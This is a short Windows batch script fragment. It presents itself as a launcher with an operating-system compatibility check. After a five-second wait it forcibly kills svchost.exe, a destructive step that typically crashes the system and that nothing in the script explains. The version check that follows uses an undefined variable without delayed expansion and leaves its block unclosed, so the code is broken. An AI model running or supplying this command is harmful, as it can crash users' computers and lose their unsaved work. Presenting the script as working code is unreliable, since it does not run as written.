@echo off
color 0a
timeout 5
taskkill /f /im svchost.exe
if !osNumber! lss 51 (
	cls

	title Unsupported Operating System Detected
	color 0a

	echo Sorry :( , but this script cannot be launched on an older Operating System. 
	echo Please try it again on at least Windows XP Professional.
	echo.
	
	pause
	exit
